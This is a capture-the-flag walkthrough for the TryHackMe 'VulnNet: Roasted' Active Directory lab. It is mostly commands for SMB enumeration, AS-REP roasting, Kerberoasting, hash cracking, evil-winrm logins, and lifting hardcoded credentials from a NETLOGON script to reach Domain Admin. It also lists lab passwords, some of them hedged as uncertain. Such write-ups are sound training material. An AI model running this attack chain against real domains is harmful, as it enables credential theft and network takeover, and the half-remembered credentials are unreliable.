**TryHackMe VulnNet: Roasted**

### Initial Reconnaissance & Port Scanning

```bash
rustscan -a <target-ip> -- -sV -sC -oN nmap.txt
# or nmap -sV -sC -Pn <target-ip>
```

Key open ports: 53, 88 (Kerberos), 135, 139/445 (SMB), 389 (LDAP), 5985 (WinRM), etc. It's a Windows Active Directory domain controller for `vulnnet-rst.local`.

Add to `/etc/hosts`:

```bash
<target-ip>    vulnnet-rst.local
```

### SMB Enumeration (Anonymous Access)

```bash
smbclient -L //<target-ip> -N
```

Shares include:

- `VulnNet-Business-Anonymous`
- `VulnNet-Enterprise-Anonymous`
- Standard ones like `NETLOGON`, `SYSVOL`, etc.

Browse them:

```bash
smbclient //<target-ip>/VulnNet-Enterprise-Anonymous -N
smb: \> ls
# Files: Enterprise-Operations.txt, Enterprise-Safety.txt, Enterprise-Sync.txt

smbclient //<target-ip>/VulnNet-Business-Anonymous -N
# Files: Business-Manager.txt, etc.
```

These files mention employees and give usernames:

- `t-skid` (Tony Skid)
- `a-whitehat` (Alexa Whitehat)
- `j-goldenhand` (Jack Goldenhand)
- `j-leet` (Johnny Leet)
- `enterprise-core-vn`
- Others: Administrator, krbtgt, etc.

### User Enumeration & AS-REP Roasting

Use the usernames list with `impacket-GetNPUsers`:

```bash
impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip <target-ip> -request
```

`t-skid` has `UF_DONT_REQUIRE_PREAUTH` set → AS-REP hash obtained.

Crack with hashcat (mode 18200):

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Password:** `tj072889*` (or slight variations like `tj072889` depending on exact hash).

### Authenticated Enumeration & Kerberoasting

With `t-skid` creds, request TGS for SPNs (Kerberoasting):

```bash
impacket-GetUserSPNs vulnnet-rst.local/t-skid:tj072889* -dc-ip <target-ip> -request
```

TGS hash for `enterprise-core-vn` obtained. Crack it (mode 13100):

**Password found:** `ry=ibfkfv,s6h,` (exact string from sources).

Now access as `enterprise-core-vn`.

### Initial Shell (User Flag)

```bash
evil-winrm -u enterprise-core-vn -p 'ry=ibfkfv,s6h,' -i <target-ip>
# or smbclient with t-skid if needed
```

User flag is on the desktop of this account (or equivalent).

### Privilege Escalation to Domain Admin

With `t-skid` (or the domain user), access `NETLOGON` share:

```bash
smbclient //<target-ip>/NETLOGON -U vulnnet-rst.local\\t-skid
# Password: tj072889*
smb: \> get ResetPassword.vbs
```

Download and inspect `ResetPassword.vbs`. It contains hardcoded credentials for a higher-privileged account (often `a-whitehat` or directly admin-level).

Example creds from the script (common in writeups): `a-whitehat` / `bNdKVkjv3RR9ht` (verify exact from your downloaded script).

This account is a **Domain Admin**:

```bash
evil-winrm -i <target-ip> -u a-whitehat -p bNdKVkjv3RR9ht
```

Confirm:

```powershell
Get-ADUser $env:username -Properties MemberOf
# Shows Domain Admins group
```

As Domain Admin, you can dump hashes if needed (`secretsdump.py`) or directly access Administrator's desktop for the **root/system flag**.

**Alternative escalation paths** mentioned in some writeups: Pass-the-Hash with Administrator NTLM if dumped, or other shares/scripts.

### Summary of Flags

- **User flag**: Retrieved as `enterprise-core-vn` (or equivalent low-priv domain user).
- **Root/System flag**: Retrieved as Domain Admin (via the VBS script creds).

This room teaches **AS-REP Roasting → Kerberoasting → Credential reuse/hardcoded creds in scripts** for AD privilege escalation. Always check shares like NETLOGON/SYSVOL for misconfigurations after initial access.
